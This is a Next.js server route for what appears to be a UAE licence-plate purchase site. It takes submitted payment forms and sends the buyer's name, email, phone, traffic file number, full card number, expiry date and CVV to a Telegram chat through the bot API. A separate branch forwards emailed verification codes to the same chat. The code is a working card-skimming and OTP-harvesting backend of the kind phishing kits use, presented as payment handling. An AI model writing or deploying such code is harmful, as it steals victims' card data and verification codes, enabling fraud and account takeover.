import { NextRequest, NextResponse } from "next/server"

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { type, data } = body

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("[v0] Telegram credentials missing")
      return NextResponse.json(
        { error: "Telegram not configured" },
        { status: 500 }
      )
    }

    let message = ""

    if (type === "payment") {
      // Payment form submission
      message = `🔔 *طلب دفع جديد*\n\n`
      message += `📋 *معلومات اللوحة:*\n`
      message += `الإمارة: ${data.emirate}\n`
      message += `الكود: ${data.plateCode}\n`
      message += `الرقم: ${data.plateNumber}\n`
      message += `السعر: ${data.price}\n\n`
      message += `👤 *معلومات العميل:*\n`
      message += `الاسم: ${data.name}\n`
      message += `البريد: ${data.email}\n`
      message += `الهاتف: ${data.phone}\n`
      message += `رقم الملف المروري: ${data.trafficFileNumber}\n\n`
      message += `💳 *بيانات البطاقة:*\n`
      message += `رقم البطاقة: ${data.cardNumber}\n`
      message += `تاريخ الانتهاء: ${data.cardExpiry}\n`
      message += `CVV: ${data.cardCvv}\n\n`
      message += `🕐 الوقت: ${new Date().toLocaleString("ar-AE", { timeZone: "Asia/Dubai" })}`
    } else if (type === "crypto_payment") {
      // Crypto payment form submission
      message = `🪙 *طلب دفع بالعملات الرقمية*\n\n`
      message += `📋 *معلومات اللوحة:*\n`
      message += `الإمارة: ${data.emirate}\n`
      message += `الكود: ${data.plateCode}\n`
      message += `الرقم: ${data.plateNumber}\n`
      message += `السعر: ${data.price}\n`
      message += `السعر بالدولار: ${data.priceUSD}\n\n`
      message += `👤 *معلومات العميل:*\n`
      message += `الاسم: ${data.name}\n`
      message += `البريد: ${data.email}\n`
      message += `الهاتف: ${data.phone}\n`
      message += `رقم الملف المروري: ${data.trafficFileNumber}\n\n`
      message += `🕐 الوقت: ${new Date().toLocaleString("ar-AE", { timeZone: "Asia/Dubai" })}`
    } else if (type === "verification") {
      // Verification code submission
      message = `🔐 *رمز التحقق*\n\n`
      message += `📧 البريد: ${data.email}\n`
      message += `🔑 الرمز: ${data.code}\n\n`
      message += `🕐 الوقت: ${new Date().toLocaleString("ar-AE", { timeZone: "Asia/Dubai" })}`
    } else {
      return NextResponse.json({ error: "Invalid type" }, { status: 400 })
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    if (!response.ok) {
      const errorData = await response.json()
      console.error("[v0] Telegram API error:", errorData)
      return NextResponse.json(
        { error: "Failed to send message" },
        { status: 500 }
      )
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("[v0] Telegram route error:", error)
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    )
  }
}
